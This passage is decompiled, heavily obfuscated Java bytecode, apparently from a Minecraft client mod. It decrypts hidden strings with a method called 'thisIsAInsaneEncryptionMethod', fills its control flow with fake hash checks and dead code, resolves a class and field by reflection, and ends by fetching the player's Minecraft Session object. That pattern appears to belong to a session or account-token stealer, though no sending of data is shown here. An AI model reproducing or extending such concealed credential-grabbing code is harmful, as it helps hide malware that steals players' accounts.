    //   3659: nop
    //   3660: nop
    //   3661: nop
    //   3662: nop
    //   3663: nop
    //   3664: nop
    //   3665: nop
    //   3666: nop
    //   3667: nop
    //   3668: nop
    //   3669: nop
    //   3670: nop
    //   3671: nop
    //   3672: nop
    //   3673: nop
    //   3674: athrow
    //   3675: nop
    //   3676: nop
    //   3677: nop
    //   3678: athrow
    //   3679: nop
    //   3680: nop
    //   3681: nop
    //   3682: nop
    //   3683: nop
    //   3684: athrow
    //   3685: nop
    //   3686: nop
    //   3687: nop
    //   3688: athrow
    //   3689: nop
    //   3690: nop
    //   3691: nop
    //   3692: nop
    //   3693: nop
    //   3694: athrow
    //   3695: iload #145
    //   3697: bipush #7
    //   3699: bipush #29
    //   3701: ishl
    //   3702: iand
    //   3703: bipush #29
    //   3705: ishr
    //   3706: iload #145
    //   3708: iconst_3
    //   3709: ishl
    //   3710: ior
    //   3711: lookupswitch default -> 4110, -1590679759 -> 3747, 2077413186 -> 3736
    //   3736: ldc_w 1000333402
    //   3739: iload #145
    //   3741: ixor
    //   3742: istore #145
    //   3744: goto -> 3755
    //   3747: ldc_w 1086569812
    //   3750: iload #145
    //   3752: ixor
    //   3753: istore #145
    //   3755: pop
    //   3756: iload #145
    //   3758: bipush #31
    //   3760: imul
    //   3761: iconst_4
    //   3762: iushr
    //   3763: iload #145
    //   3765: irem
    //   3766: iload #145
    //   3768: bipush #16
    //   3770: iushr
    //   3771: ixor
    //   3772: ldc_w 41771821
    //   3775: if_icmpne -> 3789
    //   3778: ldc_w 568124983
    //   3781: iload #145
    //   3783: ixor
    //   3784: istore #145
    //   3786: goto -> 3799
    //   3789: new java/io/IOException
    //   3792: astore_3
    //   3793: aload_3
    //   3794: invokespecial <init> : ()V
    //   3797: aload_3
    //   3798: athrow
    //   3799: ldc_w 'WRRgKgcqOFQEYh1NUUd2VU9i'
    //   3802: iload #145
    //   3804: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3807: astore #79
    //   3809: aload #27
    //   3811: aload #79
    //   3813: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   3816: istore #29
    //   3818: iload #29
    //   3820: ldc_w 1429823365
    //   3823: iload #145
    //   3825: ixor
    //   3826: if_icmpne -> 4099
    //   3829: iload #145
    //   3831: bipush #31
    //   3833: imul
    //   3834: iconst_4
    //   3835: iushr
    //   3836: iload #145
    //   3838: irem
    //   3839: iload #145
    //   3841: bipush #16
    //   3843: iushr
    //   3844: ixor
    //   3845: ldc_w 85949480
    //   3848: if_icmpne -> 4089
    //   3851: ldc_w 340118781
    //   3854: iload #145
    //   3856: ixor
    //   3857: istore #145
    //   3859: iload #145
    //   3861: ldc_w 1098683239
    //   3864: iload #145
    //   3866: ixor
    //   3867: imul
    //   3868: ldc_w 1098683260
    //   3871: iload #145
    //   3873: ixor
    //   3874: iushr
    //   3875: iload #145
    //   3877: irem
    //   3878: iload #145
    //   3880: ldc_w 1098683240
    //   3883: iload #145
    //   3885: ixor
    //   3886: iushr
    //   3887: ixor
    //   3888: ldc_w 1335726012
    //   3891: iload #145
    //   3893: ixor
    //   3894: if_icmpeq -> 3921
    //   3897: aconst_null
    //   3898: athrow
    //   3899: nop
    //   3900: nop
    //   3901: nop
    //   3902: nop
    //   3903: nop
    //   3904: nop
    //   3905: nop
    //   3906: nop
    //   3907: nop
    //   3908: nop
    //   3909: nop
    //   3910: nop
    //   3911: nop
    //   3912: nop
    //   3913: nop
    //   3914: nop
    //   3915: nop
    //   3916: nop
    //   3917: nop
    //   3918: nop
    //   3919: nop
    //   3920: athrow
    //   3921: new java/lang/RuntimeException
    //   3924: dup
    //   3925: invokespecial <init> : ()V
    //   3928: athrow
    //   3929: nop
    //   3930: nop
    //   3931: nop
    //   3932: nop
    //   3933: nop
    //   3934: nop
    //   3935: nop
    //   3936: nop
    //   3937: nop
    //   3938: nop
    //   3939: nop
    //   3940: nop
    //   3941: nop
    //   3942: nop
    //   3943: nop
    //   3944: nop
    //   3945: nop
    //   3946: nop
    //   3947: nop
    //   3948: nop
    //   3949: nop
    //   3950: athrow
    //   3951: nop
    //   3952: nop
    //   3953: nop
    //   3954: athrow
    //   3955: nop
    //   3956: nop
    //   3957: nop
    //   3958: nop
    //   3959: nop
    //   3960: athrow
    //   3961: iload #145
    //   3963: bipush #7
    //   3965: bipush #29
    //   3967: ishl
    //   3968: iand
    //   3969: bipush #29
    //   3971: ishr
    //   3972: iload #145
    //   3974: iconst_3
    //   3975: ishl
    //   3976: ior
    //   3977: lookupswitch default -> 4067, -1222032701 -> 4015, 199531458 -> 4004
    //   4004: ldc_w 1476278042
    //   4007: iload #145
    //   4009: ixor
    //   4010: istore #145
    //   4012: goto -> 4023
    //   4015: ldc_w 1617398842
    //   4018: iload #145
    //   4020: ixor
    //   4021: istore #145
    //   4023: pop
    //   4024: iload #145
    //   4026: bipush #31
    //   4028: imul
    //   4029: iconst_4
    //   4030: iushr
    //   4031: iload #145
    //   4033: irem
    //   4034: iload #145
    //   4036: bipush #16
    //   4038: iushr
    //   4039: ixor
    //   4040: ldc_w 194840831
    //   4043: if_icmpne -> 4057
    //   4046: ldc_w 1617037243
    //   4049: iload #145
    //   4051: ixor
    //   4052: istore #145
    //   4054: goto -> 4130
    //   4057: new java/lang/IllegalAccessException
    //   4060: astore_3
    //   4061: aload_3
    //   4062: invokespecial <init> : ()V
    //   4065: aload_3
    //   4066: athrow
    //   4067: new java/lang/IllegalAccessException
    //   4070: astore_3
    //   4071: aload_3
    //   4072: ldc 'Error in hash'
    //   4074: invokespecial <init> : (Ljava/lang/String;)V
    //   4077: aload_3
    //   4078: athrow
    //   4079: nop
    //   4080: nop
    //   4081: nop
    //   4082: athrow
    //   4083: nop
    //   4084: nop
    //   4085: nop
    //   4086: nop
    //   4087: nop
    //   4088: athrow
    //   4089: new java/lang/IllegalAccessException
    //   4092: astore_3
    //   4093: aload_3
    //   4094: invokespecial <init> : ()V
    //   4097: aload_3
    //   4098: athrow
    //   4099: ldc_w 1632332055
    //   4102: iload #145
    //   4104: ixor
    //   4105: istore #145
    //   4107: goto -> 4426
    //   4110: new java/io/IOException
    //   4113: astore_3
    //   4114: aload_3
    //   4115: ldc 'Error in hash'
    //   4117: invokespecial <init> : (Ljava/lang/String;)V
    //   4120: aload_3
    //   4121: athrow
    //   4122: ldc_w 1821116591
    //   4125: iload #145
    //   4127: ixor
    //   4128: istore #145
    //   4130: ldc_w 'Vh9wIE1/PQ=='
    //   4133: iload #145
    //   4135: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   4138: astore #80
    //   4140: aload #27
    //   4142: aload #80
    //   4144: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   4147: astore #30
    //   4149: ldc_w 1994433496
    //   4152: iload #145
    //   4154: ixor
    //   4155: i2b
    //   4156: istore #81
    //   4158: aload #30
    //   4160: iload #81
    //   4162: aaload
    //   4163: astore #31
    //   4165: ldc_w 'GA=='
    //   4168: iload #145
    //   4170: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   4173: astore #82
    //   4175: aload #31
    //   4177: aload #82
    //   4179: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   4182: astore #32
    //   4184: ldc_w 1994433497
    //   4187: iload #145
    //   4189: ixor
    //   4190: i2b
    //   4191: istore #83
    //   4193: aload #32
    //   4195: iload #83
    //   4197: aaload
    //   4198: astore #5
    //   4200: iload #145
    //   4202: bipush #31
    //   4204: imul
    //   4205: iconst_4
    //   4206: iushr
    //   4207: iload #145
    //   4209: irem
    //   4210: iload #145
    //   4212: bipush #16
    //   4214: iushr
    //   4215: ixor
    //   4216: ldc_w 106122132
    //   4219: if_icmpne -> 7176
    //   4222: ldc_w 1405516590
    //   4225: iload #145
    //   4227: ixor
    //   4228: istore #145
    //   4230: iload #145
    //   4232: ldc_w 623302888
    //   4235: iload #145
    //   4237: ixor
    //   4238: imul
    //   4239: ldc_w 623302899
    //   4242: iload #145
    //   4244: ixor
    //   4245: iushr
    //   4246: iload #145
    //   4248: irem
    //   4249: iload #145
    //   4251: ldc_w 623302887
    //   4254: iload #145
    //   4256: ixor
    //   4257: iushr
    //   4258: ixor
    //   4259: ldc_w 584956303
    //   4262: iload #145
    //   4264: ixor
    //   4265: if_icmpeq -> 4292
    //   4268: aconst_null
    //   4269: athrow
    //   4270: nop
    //   4271: nop
    //   4272: nop
    //   4273: nop
    //   4274: nop
    //   4275: nop
    //   4276: nop
    //   4277: nop
    //   4278: nop
    //   4279: nop
    //   4280: nop
    //   4281: nop
    //   4282: nop
    //   4283: nop
    //   4284: nop
    //   4285: nop
    //   4286: nop
    //   4287: nop
    //   4288: nop
    //   4289: nop
    //   4290: nop
    //   4291: athrow
    //   4292: new java/lang/RuntimeException
    //   4295: dup
    //   4296: invokespecial <init> : ()V
    //   4299: athrow
    //   4300: nop
    //   4301: nop
    //   4302: nop
    //   4303: nop
    //   4304: nop
    //   4305: nop
    //   4306: nop
    //   4307: nop
    //   4308: nop
    //   4309: nop
    //   4310: nop
    //   4311: nop
    //   4312: nop
    //   4313: nop
    //   4314: nop
    //   4315: nop
    //   4316: nop
    //   4317: nop
    //   4318: nop
    //   4319: nop
    //   4320: nop
    //   4321: athrow
    //   4322: iload #145
    //   4324: bipush #7
    //   4326: bipush #29
    //   4328: ishl
    //   4329: iand
    //   4330: bipush #29
    //   4332: ishr
    //   4333: iload #145
    //   4335: iconst_3
    //   4336: ishl
    //   4337: ior
    //   4338: lookupswitch default -> 4375, 691455929 -> 4387, 1712930035 -> 4364
    //   4364: ldc_w 731645680
    //   4367: iload #145
    //   4369: ixor
    //   4370: istore #145
    //   4372: goto -> 4395
    //   4375: new java/lang/IllegalAccessException
    //   4378: astore_3
    //   4379: aload_3
    //   4380: ldc 'Error in hash'
    //   4382: invokespecial <init> : (Ljava/lang/String;)V
    //   4385: aload_3
    //   4386: athrow
    //   4387: ldc_w 1652160921
    //   4390: iload #145
    //   4392: ixor
    //   4393: istore #145
    //   4395: pop
    //   4396: iload #145
    //   4398: bipush #31
    //   4400: imul
    //   4401: iconst_4
    //   4402: iushr
    //   4403: iload #145
    //   4405: irem
    //   4406: iload #145
    //   4408: bipush #16
    //   4410: iushr
    //   4411: ixor
    //   4412: ldc_w 172496794
    //   4415: if_icmpne -> 7146
    //   4418: ldc_w 1932335100
    //   4421: iload #145
    //   4423: ixor
    //   4424: istore #145
    //   4426: aconst_null
    //   4427: astore #33
    //   4429: iload #145
    //   4431: bipush #31
    //   4433: imul
    //   4434: iconst_4
    //   4435: iushr
    //   4436: iload #145
    //   4438: irem
    //   4439: iload #145
    //   4441: bipush #16
    //   4443: iushr
    //   4444: ixor
    //   4445: ldc_w 94207432
    //   4448: if_icmpne -> 7136
    //   4451: ldc_w 191832937
    //   4454: iload #145
    //   4456: ixor
    //   4457: istore #145
    //   4459: iload #145
    //   4461: ldc_w 1058870756
    //   4464: iload #145
    //   4466: ixor
    //   4467: imul
    //   4468: ldc_w 1058870783
    //   4471: iload #145
    //   4473: ixor
    //   4474: iushr
    //   4475: iload #145
    //   4477: irem
    //   4478: iload #145
    //   4480: ldc_w 1058870763
    //   4483: iload #145
    //   4485: ixor
    //   4486: iushr
    //   4487: ixor
    //   4488: ldc_w 894791792
    //   4491: iload #145
    //   4493: ixor
    //   4494: if_icmpeq -> 4521
    //   4497: aconst_null
    //   4498: athrow
    //   4499: nop
    //   4500: nop
    //   4501: nop
    //   4502: nop
    //   4503: nop
    //   4504: nop
    //   4505: nop
    //   4506: nop
    //   4507: nop
    //   4508: nop
    //   4509: nop
    //   4510: nop
    //   4511: nop
    //   4512: nop
    //   4513: nop
    //   4514: nop
    //   4515: nop
    //   4516: nop
    //   4517: nop
    //   4518: nop
    //   4519: nop
    //   4520: athrow
    //   4521: new java/lang/RuntimeException
    //   4524: dup
    //   4525: invokespecial <init> : ()V
    //   4528: athrow
    //   4529: nop
    //   4530: nop
    //   4531: nop
    //   4532: nop
    //   4533: nop
    //   4534: nop
    //   4535: nop
    //   4536: nop
    //   4537: nop
    //   4538: nop
    //   4539: nop
    //   4540: nop
    //   4541: nop
    //   4542: nop
    //   4543: nop
    //   4544: nop
    //   4545: nop
    //   4546: nop
    //   4547: nop
    //   4548: nop
    //   4549: nop
    //   4550: athrow
    //   4551: nop
    //   4552: nop
    //   4553: nop
    //   4554: athrow
    //   4555: nop
    //   4556: nop
    //   4557: nop
    //   4558: nop
    //   4559: nop
    //   4560: athrow
    //   4561: nop
    //   4562: nop
    //   4563: nop
    //   4564: athrow
    //   4565: nop
    //   4566: nop
    //   4567: nop
    //   4568: nop
    //   4569: nop
    //   4570: athrow
    //   4571: iload #145
    //   4573: bipush #7
    //   4575: bipush #29
    //   4577: ishl
    //   4578: iand
    //   4579: bipush #29
    //   4581: ishr
    //   4582: iload #145
    //   4584: iconst_3
    //   4585: ishl
    //   4586: ior
    //   4587: lookupswitch default -> 4623, -118968359 -> 4612, 831984914 -> 4635
    //   4612: ldc_w 751816826
    //   4615: iload #145
    //   4617: ixor
    //   4618: istore #145
    //   4620: goto -> 4643
    //   4623: new java/io/IOException
    //   4626: astore_3
    //   4627: aload_3
    //   4628: ldc 'Error in hash'
    //   4630: invokespecial <init> : (Ljava/lang/String;)V
    //   4633: aload_3
    //   4634: athrow
    //   4635: ldc_w 1440753443
    //   4638: iload #145
    //   4640: ixor
    //   4641: istore #145
    //   4643: pop
    //   4644: iload #145
    //   4646: bipush #31
    //   4648: imul
    //   4649: iconst_4
    //   4650: iushr
    //   4651: iload #145
    //   4653: irem
    //   4654: iload #145
    //   4656: bipush #16
    //   4658: iushr
    //   4659: ixor
    //   4660: ldc_w 107498875
    //   4663: if_icmpne -> 4677
    //   4666: ldc_w 1451008564
    //   4669: iload #145
    //   4671: ixor
    //   4672: istore #145
    //   4674: goto -> 4687
    //   4677: new java/lang/RuntimeException
    //   4680: astore_3
    //   4681: aload_3
    //   4682: invokespecial <init> : ()V
    //   4685: aload_3
    //   4686: athrow
    //   4687: ldc_w 'SxF9NQA6eUhMbAZAVAM2S055enIQVXhRVQ4+JQM5dExXLwFAQgB3F1JgdG4bUn4UdxFuJwMceVVWZgJF'
    //   4690: iload #145
    //   4692: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   4695: astore #34
    //   4697: aload #34
    //   4699: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   4702: astore #35
    //   4704: ldc_w 'Uhd1Ig4tT0tIagM='
    //   4707: iload #145
    //   4709: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   4712: astore #84
    //   4714: aload #35
    //   4716: aload #84
    //   4718: invokevirtual getField : (Ljava/lang/String;)Ljava/lang/reflect/Field;
    //   4721: astore #36
    //   4723: aconst_null
    //   4724: astore #85
    //   4726: aload #36
    //   4728: aload #85
    //   4730: invokevirtual get : (Ljava/lang/Object;)Ljava/lang/Object;
    //   4733: astore #37
    //   4735: aload #37
    //   4737: checkcast java/lang/String
    //   4740: astore #38
    //   4742: iload #145
    //   4744: bipush #31
    //   4746: imul
    //   4747: iconst_4
    //   4748: iushr
    //   4749: iload #145
    //   4751: irem
    //   4752: iload #145
    //   4754: bipush #16
    //   4756: iushr
    //   4757: ixor
    //   4758: ldc_w 117550400
    //   4761: if_icmpne -> 5362
    //   4764: ldc_w 386084916
    //   4767: iload #145
    //   4769: ixor
    //   4770: istore #145
    //   4772: goto -> 4812
    //   4775: aload #38
    //   4777: astore #33
    //   4779: iload #145
    //   4781: bipush #31
    //   4783: imul
    //   4784: iconst_4
    //   4785: iushr
    //   4786: iload #145
    //   4788: irem
    //   4789: iload #145
    //   4791: bipush #16
    //   4793: iushr
    //   4794: ixor
    //   4795: ldc_w 36533099
    //   4798: if_icmpne -> 5352
    //   4801: ldc_w 1924632801
    //   4804: iload #145
    //   4806: ixor
    //   4807: istore #145
    //   4809: goto -> 5372
    //   4812: iload #145
    //   4814: ldc_w 1387091870
    //   4817: iload #145
    //   4819: ixor
    //   4820: imul
    //   4821: ldc_w 1387091845
    //   4824: iload #145
    //   4826: ixor
    //   4827: iushr
    //   4828: iload #145
    //   4830: irem
    //   4831: iload #145
    //   4833: ldc_w 1387091857
    //   4836: iload #145
    //   4838: ixor
    //   4839: iushr
    //   4840: ixor
    //   4841: ldc_w 1384307877
    //   4844: iload #145
    //   4846: ixor
    //   4847: if_icmpeq -> 4874
    //   4850: aconst_null
    //   4851: athrow
    //   4852: nop
    //   4853: nop
    //   4854: nop
    //   4855: nop
    //   4856: nop
    //   4857: nop
    //   4858: nop
    //   4859: nop
    //   4860: nop
    //   4861: nop
    //   4862: nop
    //   4863: nop
    //   4864: nop
    //   4865: nop
    //   4866: nop
    //   4867: nop
    //   4868: nop
    //   4869: nop
    //   4870: nop
    //   4871: nop
    //   4872: nop
    //   4873: athrow
    //   4874: new java/io/IOException
    //   4877: dup
    //   4878: invokespecial <init> : ()V
    //   4881: athrow
    //   4882: nop
    //   4883: nop
    //   4884: nop
    //   4885: nop
    //   4886: nop
    //   4887: nop
    //   4888: nop
    //   4889: nop
    //   4890: nop
    //   4891: nop
    //   4892: nop
    //   4893: nop
    //   4894: nop
    //   4895: nop
    //   4896: nop
    //   4897: nop
    //   4898: nop
    //   4899: nop
    //   4900: nop
    //   4901: nop
    //   4902: nop
    //   4903: athrow
    //   4904: iload #145
    //   4906: bipush #7
    //   4908: bipush #29
    //   4910: ishl
    //   4911: iand
    //   4912: bipush #29
    //   4914: ishr
    //   4915: iload #145
    //   4917: iconst_3
    //   4918: ishl
    //   4919: ior
    //   4920: lookupswitch default -> 7104, -1788167158 -> 4948, 96175107 -> 4959
    //   4948: ldc_w 1275029526
    //   4951: iload #145
    //   4953: ixor
    //   4954: istore #145
    //   4956: goto -> 4967
    //   4959: ldc_w 2045071127
    //   4962: iload #145
    //   4964: ixor
    //   4965: istore #145
    //   4967: pop
    //   4968: iload #145
    //   4970: bipush #31
    //   4972: imul
    //   4973: iconst_4
    //   4974: iushr
    //   4975: iload #145
    //   4977: irem
    //   4978: iload #145
    //   4980: bipush #16
    //   4982: iushr
    //   4983: ixor
    //   4984: ldc_w 17777254
    //   4987: if_icmpne -> 7116
    //   4990: ldc_w 453027199
    //   4993: iload #145
    //   4995: ixor
    //   4996: istore #145
    //   4998: goto -> 4775
    //   5001: iload #145
    //   5003: bipush #7
    //   5005: bipush #29
    //   5007: ishl
    //   5008: iand
    //   5009: bipush #29
    //   5011: ishr
    //   5012: iload #145
    //   5014: iconst_3
    //   5015: ishl
    //   5016: ior
    //   5017: lookupswitch default -> 5055, 311744320 -> 5044, 762527146 -> 5067
    //   5044: ldc_w 1182709572
    //   5047: iload #145
    //   5049: ixor
    //   5050: istore #145
    //   5052: goto -> 5075
    //   5055: new java/lang/RuntimeException
    //   5058: astore_3
    //   5059: aload_3
    //   5060: ldc 'Error in hash'
    //   5062: invokespecial <init> : (Ljava/lang/String;)V
    //   5065: aload_3
    //   5066: athrow
    //   5067: ldc_w 25315865
    //   5070: iload #145
    //   5072: ixor
    //   5073: istore #145
    //   5075: astore #53
    //   5077: aload #33
    //   5079: astore #38
    //   5081: iload #145
    //   5083: bipush #31
    //   5085: imul
    //   5086: iconst_4
    //   5087: iushr
    //   5088: iload #145
    //   5090: irem
    //   5091: iload #145
    //   5093: bipush #16
    //   5095: iushr
    //   5096: ixor
    //   5097: ldc_w 68541521
    //   5100: if_icmpne -> 5342
    //   5103: ldc_w 272648899
    //   5106: iload #145
    //   5108: ixor
    //   5109: istore #145
    //   5111: iload #145
    //   5113: ldc_w 1416390512
    //   5116: iload #145
    //   5118: ixor
    //   5119: imul
    //   5120: ldc_w 1416390507
    //   5123: iload #145
    //   5125: ixor
    //   5126: iushr
    //   5127: iload #145
    //   5129: irem
    //   5130: iload #145
    //   5132: ldc_w 1416390527
    //   5135: iload #145
    //   5137: ixor
    //   5138: iushr
    //   5139: ixor
    //   5140: ldc_w 1476279140
    //   5143: iload #145
    //   5145: ixor
    //   5146: if_icmpeq -> 5173
    //   5149: aconst_null
    //   5150: athrow
    //   5151: nop
    //   5152: nop
    //   5153: nop
    //   5154: nop
    //   5155: nop
    //   5156: nop
    //   5157: nop
    //   5158: nop
    //   5159: nop
    //   5160: nop
    //   5161: nop
    //   5162: nop
    //   5163: nop
    //   5164: nop
    //   5165: nop
    //   5166: nop
    //   5167: nop
    //   5168: nop
    //   5169: nop
    //   5170: nop
    //   5171: nop
    //   5172: athrow
    //   5173: new java/io/IOException
    //   5176: dup
    //   5177: invokespecial <init> : ()V
    //   5180: athrow
    //   5181: nop
    //   5182: nop
    //   5183: nop
    //   5184: nop
    //   5185: nop
    //   5186: nop
    //   5187: nop
    //   5188: nop
    //   5189: nop
    //   5190: nop
    //   5191: nop
    //   5192: nop
    //   5193: nop
    //   5194: nop
    //   5195: nop
    //   5196: nop
    //   5197: nop
    //   5198: nop
    //   5199: nop
    //   5200: nop
    //   5201: nop
    //   5202: athrow
    //   5203: iload #145
    //   5205: bipush #7
    //   5207: bipush #29
    //   5209: ishl
    //   5210: iand
    //   5211: bipush #29
    //   5213: ishr
    //   5214: iload #145
    //   5216: iconst_3
    //   5217: ishl
    //   5218: ior
    //   5219: lookupswitch default -> 5266, -1553777798 -> 5255, -1203919831 -> 5244
    //   5244: ldc_w 452631952
    //   5247: iload #145
    //   5249: ixor
    //   5250: istore #145
    //   5252: goto -> 5278
    //   5255: ldc_w 2039565946
    //   5258: iload #145
    //   5260: ixor
    //   5261: istore #145
    //   5263: goto -> 5278
    //   5266: new java/lang/IllegalAccessException
    //   5269: astore_3
    //   5270: aload_3
    //   5271: ldc 'Error in hash'
    //   5273: invokespecial <init> : (Ljava/lang/String;)V
    //   5276: aload_3
    //   5277: athrow
    //   5278: pop
    //   5279: iload #145
    //   5281: bipush #31
    //   5283: imul
    //   5284: iconst_4
    //   5285: iushr
    //   5286: iload #145
    //   5288: irem
    //   5289: iload #145
    //   5291: bipush #16
    //   5293: iushr
    //   5294: ixor
    //   5295: ldc_w 152719973
    //   5298: if_icmpne -> 5312
    //   5301: ldc_w 551930014
    //   5304: iload #145
    //   5306: ixor
    //   5307: istore #145
    //   5309: goto -> 5830
    //   5312: new java/lang/RuntimeException
    //   5315: astore_3
    //   5316: aload_3
    //   5317: invokespecial <init> : ()V
    //   5320: aload_3
    //   5321: athrow
    //   5322: nop
    //   5323: nop
    //   5324: nop
    //   5325: athrow
    //   5326: nop
    //   5327: nop
    //   5328: nop
    //   5329: nop
    //   5330: nop
    //   5331: athrow
    //   5332: nop
    //   5333: nop
    //   5334: nop
    //   5335: athrow
    //   5336: nop
    //   5337: nop
    //   5338: nop
    //   5339: nop
    //   5340: nop
    //   5341: athrow
    //   5342: new java/io/IOException
    //   5345: astore_3
    //   5346: aload_3
    //   5347: invokespecial <init> : ()V
    //   5350: aload_3
    //   5351: athrow
    //   5352: new java/io/IOException
    //   5355: astore_3
    //   5356: aload_3
    //   5357: invokespecial <init> : ()V
    //   5360: aload_3
    //   5361: athrow
    //   5362: new java/io/IOException
    //   5365: astore_3
    //   5366: aload_3
    //   5367: invokespecial <init> : ()V
    //   5370: aload_3
    //   5371: athrow
    //   5372: iload #145
    //   5374: ldc_w 1894058518
    //   5377: iload #145
    //   5379: ixor
    //   5380: imul
    //   5381: ldc_w 1894058509
    //   5384: iload #145
    //   5386: ixor
    //   5387: iushr
    //   5388: iload #145
    //   5390: irem
    //   5391: iload #145
    //   5393: ldc_w 1894058521
    //   5396: iload #145
    //   5398: ixor
    //   5399: iushr
    //   5400: ixor
    //   5401: ldc_w 2053028253
    //   5404: iload #145
    //   5406: ixor
    //   5407: if_icmpeq -> 5434
    //   5410: aconst_null
    //   5411: athrow
    //   5412: nop
    //   5413: nop
    //   5414: nop
    //   5415: nop
    //   5416: nop
    //   5417: nop
    //   5418: nop
    //   5419: nop
    //   5420: nop
    //   5421: nop
    //   5422: nop
    //   5423: nop
    //   5424: nop
    //   5425: nop
    //   5426: nop
    //   5427: nop
    //   5428: nop
    //   5429: nop
    //   5430: nop
    //   5431: nop
    //   5432: nop
    //   5433: athrow
    //   5434: new java/io/IOException
    //   5437: dup
    //   5438: invokespecial <init> : ()V
    //   5441: athrow
    //   5442: nop
    //   5443: nop
    //   5444: nop
    //   5445: nop
    //   5446: nop
    //   5447: nop
    //   5448: nop
    //   5449: nop
    //   5450: nop
    //   5451: nop
    //   5452: nop
    //   5453: nop
    //   5454: nop
    //   5455: nop
    //   5456: nop
    //   5457: nop
    //   5458: nop
    //   5459: nop
    //   5460: nop
    //   5461: nop
    //   5462: nop
    //   5463: athrow
    //   5464: nop
    //   5465: nop
    //   5466: nop
    //   5467: athrow
    //   5468: nop
    //   5469: nop
    //   5470: nop
    //   5471: nop
    //   5472: nop
    //   5473: athrow
    //   5474: nop
    //   5475: nop
    //   5476: nop
    //   5477: athrow
    //   5478: nop
    //   5479: nop
    //   5480: nop
    //   5481: nop
    //   5482: nop
    //   5483: athrow
    //   5484: iload #145
    //   5486: bipush #7
    //   5488: bipush #29
    //   5490: ishl
    //   5491: iand
    //   5492: bipush #29
    //   5494: ishr
    //   5495: iload #145
    //   5497: iconst_3
    //   5498: ishl
    //   5499: ior
    //   5500: lookupswitch default -> 5528, -2027401141 -> 5540, -1511386597 -> 5551
    //   5528: new java/lang/IllegalAccessException
    //   5531: astore_3
    //   5532: aload_3
    //   5533: ldc 'Error in hash'
    //   5535: invokespecial <init> : (Ljava/lang/String;)V
    //   5538: aload_3
    //   5539: athrow
    //   5540: ldc_w 1797874902
    //   5543: iload #145
    //   5545: ixor
    //   5546: istore #145
    //   5548: goto -> 5559
    //   5551: ldc_w 1869687964
    //   5554: iload #145
    //   5556: ixor
    //   5557: istore #145
    //   5559: pop
    //   5560: iload #145
    //   5562: bipush #31
    //   5564: imul
    //   5565: iconst_4
    //   5566: iushr
    //   5567: iload #145
    //   5569: irem
    //   5570: iload #145
    //   5572: bipush #16
    //   5574: iushr
    //   5575: ixor
    //   5576: ldc_w 98307356
    //   5579: if_icmpne -> 5593
    //   5582: ldc_w 1518769841
    //   5585: iload #145
    //   5587: ixor
    //   5588: istore #145
    //   5590: goto -> 5603
    //   5593: new java/io/IOException
    //   5596: astore_3
    //   5597: aload_3
    //   5598: invokespecial <init> : ()V
    //   5601: aload_3
    //   5602: athrow
    //   5603: iload #145
    //   5605: bipush #31
    //   5607: imul
    //   5608: iconst_4
    //   5609: iushr
    //   5610: iload #145
    //   5612: irem
    //   5613: iload #145
    //   5615: bipush #16
    //   5617: iushr
    //   5618: ixor
    //   5619: ldc_w 243335199
    //   5622: if_icmpne -> 5636
    //   5625: ldc_w 2066630820
    //   5628: iload #145
    //   5630: ixor
    //   5631: istore #145
    //   5633: goto -> 5646
    //   5636: new java/lang/RuntimeException
    //   5639: astore_3
    //   5640: aload_3
    //   5641: invokespecial <init> : ()V
    //   5644: aload_3
    //   5645: athrow
    //   5646: iload #145
    //   5648: ldc_w 979677397
    //   5651: iload #145
    //   5653: ixor
    //   5654: imul
    //   5655: ldc_w 979677390
    //   5658: iload #145
    //   5660: ixor
    //   5661: iushr
    //   5662: iload #145
    //   5664: irem
    //   5665: iload #145
    //   5667: ldc_w 979677402
    //   5670: iload #145
    //   5672: ixor
    //   5673: iushr
    //   5674: ixor
    //   5675: ldc_w 994548777
    //   5678: iload #145
    //   5680: ixor
    //   5681: if_icmpeq -> 5708
    //   5684: aconst_null
    //   5685: athrow
    //   5686: nop
    //   5687: nop
    //   5688: nop
    //   5689: nop
    //   5690: nop
    //   5691: nop
    //   5692: nop
    //   5693: nop
    //   5694: nop
    //   5695: nop
    //   5696: nop
    //   5697: nop
    //   5698: nop
    //   5699: nop
    //   5700: nop
    //   5701: nop
    //   5702: nop
    //   5703: nop
    //   5704: nop
    //   5705: nop
    //   5706: nop
    //   5707: athrow
    //   5708: new java/io/IOException
    //   5711: dup
    //   5712: invokespecial <init> : ()V
    //   5715: athrow
    //   5716: nop
    //   5717: nop
    //   5718: nop
    //   5719: nop
    //   5720: nop
    //   5721: nop
    //   5722: nop
    //   5723: nop
    //   5724: nop
    //   5725: nop
    //   5726: nop
    //   5727: nop
    //   5728: nop
    //   5729: nop
    //   5730: nop
    //   5731: nop
    //   5732: nop
    //   5733: nop
    //   5734: nop
    //   5735: nop
    //   5736: nop
    //   5737: athrow
    //   5738: iload #145
    //   5740: bipush #7
    //   5742: bipush #29
    //   5744: ishl
    //   5745: iand
    //   5746: bipush #29
    //   5748: ishr
    //   5749: iload #145
    //   5751: iconst_3
    //   5752: ishl
    //   5753: ior
    //   5754: lookupswitch default -> 7062, -1639620056 -> 5780, -752515503 -> 5791
    //   5780: ldc_w 1546646651
    //   5783: iload #145
    //   5785: ixor
    //   5786: istore #145
    //   5788: goto -> 5799
    //   5791: ldc_w 1971579124
    //   5794: iload #145
    //   5796: ixor
    //   5797: istore #145
    //   5799: pop
    //   5800: iload #145
    //   5802: bipush #31
    //   5804: imul
    //   5805: iconst_4
    //   5806: iushr
    //   5807: iload #145
    //   5809: irem
    //   5810: iload #145
    //   5812: bipush #16
    //   5814: iushr
    //   5815: ixor
    //   5816: ldc_w 181433631
    //   5819: if_icmpne -> 7052
    //   5822: ldc_w 1124055477
    //   5825: iload #145
    //   5827: ixor
    //   5828: istore #145
    //   5830: aload_0
    //   5831: astore #39
    //   5833: aload #39
    //   5835: getfield mc : Lnet/minecraft/client/Minecraft;
    //   5838: astore #40
    //   5840: aload #40
    //   5842: invokevirtual func_110432_I : ()Lnet/minecraft/util/Session;
